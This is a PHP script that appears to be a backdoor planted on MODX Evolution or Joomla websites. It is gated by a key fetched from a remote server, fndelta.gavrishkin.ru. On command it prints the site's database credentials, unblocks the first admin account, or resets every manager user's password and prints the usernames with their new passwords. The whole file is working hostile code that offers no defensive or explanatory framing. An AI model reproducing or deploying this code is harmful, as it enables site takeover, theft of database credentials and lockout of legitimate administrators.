<?php
// Buran_002
// scorN - v.3.0
// 14.06.2016
// Буран
//====================================================================================================
	error_reporting(-1);
           
//====================================================================================================
	define( '_DS', DIRECTORY_SEPARATOR );
	$host= str_replace( "www.", "", $_SERVER[ 'HTTP_HOST' ] );
	$root= __FILE__;
	$scriptname= $_SERVER[ 'SCRIPT_NAME' ];
	if( strpos( $root, "\\" ) !== false ) $scriptname= str_replace( "/", "\\", $scriptname );
	$root= str_replace( $scriptname, '', $root );
	if( substr( $root, strlen( $root )-1, 1 ) == _DS ) $root= substr( $root, 0, -1 );
	if( isset( $_GET[ 'dir' ] ) ) $dir= trim( urldecode( $_GET[ 'dir' ] ) ); else $dir= '';
		if( substr( $dir, 0, 1 ) != _DS ) $dir= _DS . $dir;
		if( substr( $dir, strlen( $dir )-1, 1 ) == _DS ) $dir= substr( $dir, 0, -1 );
	$root_dir= $root . $dir;
	
	$act= $_GET[ 'act' ];
	
	$ww= @file_get_contents( "http://fndelta.gavrishkin.ru/__password__002.php?host=". $host ."&w=". $_GET[ 'w' ] );
	if( ! $ww || $_GET[ 'w' ] == '' || $_GET[ 'w' ] != $ww ){ print '[[FAIL]]'; exit(); }
//====================================================================================================

if( $act == 'changepassword' || $act == 'printdbpassword' || $act == 'unblockedadmin' )
{
	srand( time() );
	
	$cms= cms();
	
	if( $cms[ 0 ] == 'modx_evo' )
	{
		@include_once( $root .'/manager/includes/config.inc.php' );
		$table_users= "manager_users";
		$table_user_attributes= "user_attributes";
	}
	
	if( $act == 'unblockedadmin' )
	{
		@mysql_connect( $database_server, $database_user, $database_password );
		$mysql_select_db_result= @mysql_select_db( trim( $dbase, "`" ) );
		@mysql_query( "{$database_connection_method} {$database_connection_charset}" );
		//$table_prefix
		if( $mysql_select_db_result )
		{
			mysql_query( "UPDATE `{$table_prefix}{$table_user_attributes}` SET blocked='0', blockeduntil='0', blockedafter='0' WHERE id=1 LIMIT 1" );
			print "[[OK]]\n";
		}
		@mysql_close();
		
	}elseif( $act == 'changepassword' ){
		@mysql_connect( $database_server, $database_user, $database_password );
		$mysql_select_db_result= @mysql_select_db( trim( $dbase, "`" ) );
		@mysql_query( "{$database_connection_method} {$database_connection_charset}" );
		//$table_prefix
		if( $mysql_select_db_result )
		{
			$rr= mysql_query( "SELECT * FROM `{$table_prefix}{$table_users}`" );
			if( $rr )
			{
				mysql_query( "CREATE TABLE `{$table_prefix}{$table_users}_". date( 'YmdHis' ) ."` LIKE `{$table_prefix}{$table_users}`" );
				mysql_query( "INSERT INTO `{$table_prefix}{$table_users}_". date( 'YmdHis' ) ."` SELECT * FROM `{$table_prefix}{$table_users}`" );
				
				print "[[OK]]\n";
				print $host ."\n";
				print "[[CMS]]\n";
				print $cms[ 0 ] ."\n";
				print $cms[ 1 ] ."\n";
				print $cms[ 2 ] ."\n";
				print "[[DB]]\n";
				print $database_server ."\n";
				print $database_user ."\n";
				print $database_password ."\n";
				print $dbase ."\n";
				while( $row= mysql_fetch_assoc( $rr ) )
				{
					print "[[PASSWORD]]\n";
					$newpassword= password( 12 );
					if( $cms[ 0 ] == 'modx_evo' )
					{
						$newpassword_todb= MD5( $newpassword );
					}
					mysql_query( "UPDATE `{$table_prefix}{$table_users}` SET password='{$newpassword_todb}' WHERE id=". $row[ 'id' ] ." LIMIT 1" );
					print $row[ 'username' ] ."\n";
					print $newpassword ."\n";
				}
			}
		}
		@mysql_close();
		
	}else{
		print "[[OK]]\n";
		print $host ."\n";
		print "[[CMS]]\n";
		print $cms[ 0 ] ."\n";
		print $cms[ 1 ] ."\n";
		print $cms[ 2 ] ."\n";
		print "[[DB]]\n";
		print $database_server ."\n";
		print $database_user ."\n";
		print $database_password ."\n";
		print $dbase ."\n";
	}
}

//===============================================================================
function password( $length )
{
	$simbols= array(
		'a','b','s','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
		'A','B','S','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
		'_','_','_','_',
		'0','1','2','3','4','5','6','7','8','9',	'0','1','2','3','4','5','6','7','8','9',
	);
	for( $o= 1; $o <= $length; $o++ )
	{
		$rand_tmp= rand( 0, count( $simbols )-1 );
		$simbol_tmp= $simbols[ $rand_tmp ];
		$password .= $simbol_tmp;
	}
	return $password;
}
function cms()
{
	//v003
	global $root_dir;
	
	@include( $root_dir ._DS.'manager/includes/version.inc.php' );
	if( ! empty( $modx_full_appname ) )
	{
		$cms= 'modx_evo';
		$cmsname= $modx_full_appname;
		$cmsver= $modx_version;
	}
	@include( $root_dir ._DS.'configuration.php' );
	if( class_exists( 'JConfig' ) ) $conf= new JConfig();
	if( $conf->host )
	{
		$cms= 'joomla';
		$cmsname= '';
		$cmsver= '';
	}
	
	return array( $cms, $cmsname, $cmsver );
}